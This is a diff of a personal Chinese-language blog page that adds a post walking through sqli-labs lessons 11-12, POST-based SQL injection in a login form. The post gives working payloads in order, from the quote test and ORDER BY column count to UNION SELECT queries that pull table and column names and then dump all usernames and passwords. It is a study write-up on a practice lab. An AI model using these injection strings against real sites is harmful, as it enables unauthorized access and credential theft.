@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>Tags: sql_lab | blackceng的小窝</title>
+    <title>post_union（less11-12） | blackceng的小窝</title>
     <meta name="author" content="blackceng" />
     <meta name="description" content="我们要做的，就是追上那该死的火车，CJ！" />
     <meta name="keywords" content="" />
@@ -37,6 +37,10 @@
 
 
 <script src="/js/lib/preview.js"></script>
+
+
+
+
 
 
 
@@ -150,188 +154,87 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div id="archives">
-    
-    <div class="categories-tags">
+            <div class="article">
+    <div>
+        <h1>post_union（less11-12）</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/12/26
+        </span>
         
-        
-        
-        <span>
-            <a href="/tags/sql-lab/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
+        <span class="category">
+            <a href="/categories/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/">
                 <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                sql_lab
+                从零开始的sql注入生活
             </a>
         </span>
         
         
-        
-        
-        
-        <span>
-            <a href="/tags/hexo/" style="background: #ff7d73">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                hexo
-            </a>
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/sql-lab/" style="color: #00a596">
+                    sql_lab
+                </a>
+            </span>
+            
         </span>
         
-        
     </div>
     
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2025/12/26</div>
-            <a href="/2025/12/26/post-union/">
-                <h3>post_union（less11-12）</h3>
-            </a>
-            <div class="info">
-                
-                <span class="category">
-                    <a href="/categories/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/">
-                        <span class="icon">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </span>
-                        从零开始的sql注入生活
-                    </a>
-                </span>
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    
-                    <span class="tag">
-                        
-                        <a href="/tags/sql-lab/" style="color: #ff7d73">
-                            sql_lab
-                        </a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
+    <div class="content" v-pre>
+        <h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>其实和less1-4的原理没有区别，只是在请求方式上改变（即只是输入和构造代码的地方，less1-4是get请求（向服务端请求数据）less11-12是post请求（向服务端发送数据）。故其他不再赘述。</p>
+<h1 id="手工注入过程"><a href="#手工注入过程" class="headerlink" title="手工注入过程"></a>手工注入过程</h1><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p>在username栏键入a’</p>
+<p><img src="/images/0b12bc95-309f-4aff-884d-db258489aa18.png"></p>
+<p>可以看见报错，说明存在sql注入且是字符型。</p>
+<p>而且当我们正常登录时，网页会正常回显对应信息，因此可以使用union注入。<img src="/images/QQ_1766741720377.png"></p>
+<h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p>在username键入</p>
+<pre><code>a&#39; or 1=1 order by 2--+
+</code></pre>
+<p><img src="/images/QQ_1766742067749.png"></p>
+<p><img src="/images/QQ_1766742130031.png"></p>
+<p>可以判断有两列。</p>
+<h2 id="查看回显位置"><a href="#查看回显位置" class="headerlink" title="查看回显位置"></a>查看回显位置</h2><p><img src="/images/QQ_1766742524265.png"></p>
+<pre><code>a&#39; union select 1,2#
+</code></pre>
+<p>1，2位置可以回显</p>
+<h2 id="开始union注入"><a href="#开始union注入" class="headerlink" title="开始union注入"></a>开始union注入</h2><pre><code>a&#39; union select 1,database()#
+</code></pre>
+<p><img src="/images/QQ_1766742704805.png"></p>
+<p>得到数据库名security</p>
+<pre><code>a&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;#
+</code></pre>
+<p><img src="/images/QQ_1766742867863.png"></p>
+<p>显然我们需要users</p>
+<pre><code>a&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#
+</code></pre>
+<p><img src="/images/QQ_1766743390238.png"></p>
+<p>得到username,password</p>
+<pre><code>a&#39; union select group_concat(username),group_concat(password) from security.users#
+
+</code></pre>
+<p><img src="/images/QQ_1766743571717.png"></p>
+<p>从而得到用户名和密码</p>
+<p>less12和11基本相同，只是闭合符号不同，经过尝试可知闭合符号为”).之后如上操作即可。</p>
+
     </div>
     
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2025/12/24</div>
-            <a href="/2025/12/24/base/">
-                <h3>sql注入基础</h3>
-            </a>
-            <div class="info">
-                
-                <span class="category">
-                    <a href="/categories/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/">
-                        <span class="icon">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </span>
-                        从零开始的sql注入生活
-                    </a>
-                </span>
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    
-                    <span class="tag">
-                        
-                        <a href="/tags/sql-lab/" style="color: #00bcd4">
-                            sql_lab
-                        </a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
-    </div>
     
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2025/12/24</div>
-            <a href="/2025/12/24/less5-7/">
-                <h3>less5-6</h3>
-            </a>
-            <div class="info">
-                
-                <span class="category">
-                    <a href="/categories/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/">
-                        <span class="icon">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </span>
-                        从零开始的sql注入生活
-                    </a>
-                </span>
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    
-                    <span class="tag">
-                        
-                        <a href="/tags/sql-lab/" style="color: #ff7d73">
-                            sql_lab
-                        </a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
-    </div>
     
-    <div class="timeline">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2025/12/22</div>
-            <a href="/2025/12/22/sql-lab-less1-4/">
-                <h3>进入sql注入世界的第一天</h3>
-            </a>
-            <div class="info">
-                
-                <span class="category">
-                    <a href="/categories/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/">
-                        <span class="icon">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </span>
-                        从零开始的sql注入生活
-                    </a>
-                </span>
-                
-                
-                <span class="tags">
-                    <span class="icon">
-                        <i class="fa-solid fa-tags fa-fw"></i>
-                    </span>
-                    
-                    
-                    <span class="tag">
-                        
-                        <a href="/tags/sql-lab/" style="color: #03a9f4">
-                            sql_lab
-                        </a>
-                    </span>
-                    
-                </span>
-                
-            </div>
-        </div>
-    </div>
+    
+    
+    
     
 </div>
 
@@ -363,6 +266,12 @@
         
     </div>
     <script src="/js/main.js"></script>
+    
+    
+
+
+
+
     
 <canvas
     id="fireworks"
